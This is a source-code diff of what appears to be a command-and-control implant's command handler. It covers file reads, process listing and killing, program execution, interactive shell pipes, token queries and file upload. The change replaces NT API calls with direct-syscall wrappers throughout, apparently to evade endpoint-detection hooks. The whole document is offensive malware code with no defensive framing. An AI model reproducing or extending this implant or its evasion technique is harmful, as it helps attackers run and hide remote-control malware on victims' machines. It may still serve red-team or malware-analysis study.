@@ -1,6 +1,7 @@
 #include "Commander.h"
 #include "bof_loader.h"
 #include "Boffer.h"
+#include "Syscalls.h"
 
 extern HANDLE g_StoredToken;
 
@@ -184,7 +185,7 @@ void Commander::CmdCat(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	}
 
 	if (hFile) {
-		ApiNt->NtClose(hFile);
+		SysNtClose(hFile);
 		hFile = NULL;
 	}
 
@@ -403,7 +404,7 @@ void Commander::CmdGetUid(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	}
 
 	if (TokenHandle)
-		ApiNt->NtClose(TokenHandle);
+		SysNtClose(TokenHandle);
 
 	MemFreeLocal( (LPVOID*)&username, 512);
 	MemFreeLocal( (LPVOID*)&domain, 512);
@@ -711,12 +712,12 @@ void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	PSYSTEM_PROCESS_INFORMATION spi = NULL, spiAddr = NULL;
 
 	ULONG spiSize = 0;
-	NTSTATUS NtStatus = ApiNt->NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &spiSize);
+	NTSTATUS NtStatus = SysNtQuerySystemInformation(SystemProcessInformation, NULL, 0, &spiSize);
 	if (!NT_SUCCESS(NtStatus)) {
 		spiSize += 0x1000;
 		spi = (PSYSTEM_PROCESS_INFORMATION) MemAllocLocal(spiSize);
 		if (spi)
-			NtStatus = ApiNt->NtQuerySystemInformation(SystemProcessInformation, spi, spiSize, &spiSize);
+			NtStatus = SysNtQuerySystemInformation(SystemProcessInformation, spi, spiSize, &spiSize);
 	}
 	spiAddr = spi;
 
@@ -748,15 +749,15 @@ void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
 			HANDLE    hToken = NULL;
 			HANDLE    hProcess = NULL;
 			CLIENT_ID clientId = { spi->UniqueProcessId, 0 };
-			NtStatus = ApiNt->NtOpenProcess(&hProcess, accessMask, &ObjectAttr, &clientId);
+			NtStatus = SysNtOpenProcess(&hProcess, accessMask, &ObjectAttr, &clientId);
 			if (NT_SUCCESS(NtStatus)) {
 
 				ULONG_PTR piWow64 = NULL;
-				NtStatus = ApiNt->NtQueryInformationProcess(hProcess, ProcessWow64Information, &piWow64, sizeof(ULONG_PTR), NULL);
+				NtStatus = SysNtQueryInformationProcess(hProcess, ProcessWow64Information, &piWow64, sizeof(ULONG_PTR), NULL);
 				if (NT_SUCCESS(NtStatus))
 					arch64 = (piWow64 == 0);
 
-				NtStatus = ApiNt->NtOpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
+				NtStatus = SysNtOpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
 				if (NT_SUCCESS(NtStatus))
 					result = TokenToUser(hToken, username, &usernameSize, domain, &domainSize, &elevated);
 			}
@@ -782,11 +783,11 @@ void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
 			}
 
 			if (hProcess) {
-				ApiNt->NtClose(hProcess);
+				SysNtClose(hProcess);
 				hProcess = NULL;
 			}
 			if (hToken) {
-				ApiNt->NtClose(hToken);
+				SysNtClose(hToken);
 				hToken = NULL;
 			}
 
@@ -829,10 +830,10 @@ void Commander::CmdPsKill(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	CLIENT_ID clientID = { (HANDLE)pid, 0 };
 	HANDLE    hProcess = NULL;
 
-	NTSTATUS status = ApiNt->NtOpenProcess(&hProcess, PROCESS_TERMINATE, &ObjectAttr, &clientID);
+	NTSTATUS status = SysNtOpenProcess(&hProcess, PROCESS_TERMINATE, &ObjectAttr, &clientID);
 	if ( NT_SUCCESS(status) ) {
 		outPacker->Pack32(commandId);
-		ApiNt->NtTerminateProcess(hProcess, 0);
+		SysNtTerminateProcess(hProcess, 0);
 		outPacker->Pack32(pid);
 	}
 	else {
@@ -842,7 +843,7 @@ void Commander::CmdPsKill(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	}
 
 	if (hProcess) {
-		ApiNt->NtClose(hProcess);
+		SysNtClose(hProcess);
 		hProcess = NULL;
 	}
 }
@@ -909,21 +910,21 @@ void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack8(progOutput);
 		outPacker->PackBytes((PBYTE)progArgs, progArgsSize);
 
-		ApiNt->NtClose(pi.hThread);
+		SysNtClose(pi.hThread);
 		pi.hThread = NULL;
 		if (!progOutput) {
-			ApiNt->NtClose(pi.hProcess);
+			SysNtClose(pi.hProcess);
 			pi.hProcess = NULL;
 		}
 	}
 	else {
 		if (pipeRead) {
-			ApiNt->NtClose(pipeRead);
+			SysNtClose(pipeRead);
 			pipeRead = NULL;
 		}
 
 		if (pipeWrite) {
-			ApiNt->NtClose(pipeWrite);
+			SysNtClose(pipeWrite);
 			pipeWrite = NULL;
 		}
 
@@ -1016,8 +1017,8 @@ void Commander::CmdShellStart(ULONG commandId, Packer* inPacker, Packer* outPack
 
 	BOOL result = ApiWin->CreateProcessA(NULL, progArgs, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
 
-	ApiNt->NtClose(shellOutPipe);
-	ApiNt->NtClose(shellInPipe);
+	SysNtClose(shellOutPipe);
+	SysNtClose(shellInPipe);
 
 	if (result) {
 
@@ -1030,12 +1031,12 @@ void Commander::CmdShellStart(ULONG commandId, Packer* inPacker, Packer* outPack
 	}
 	else {
 		if (beaconOutPipe) {
-			ApiNt->NtClose(beaconOutPipe);
+			SysNtClose(beaconOutPipe);
 			beaconOutPipe = NULL;
 		}
 
 		if (beaconInPipe) {
-			ApiNt->NtClose(beaconInPipe);
+			SysNtClose(beaconInPipe);
 			beaconInPipe = NULL;
 		}
 
@@ -1178,7 +1179,7 @@ void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		}
 
 		if (hFile) {
-			ApiNt->NtClose(hFile);
+			SysNtClose(hFile);
 			hFile = NULL;
 		}
 	}
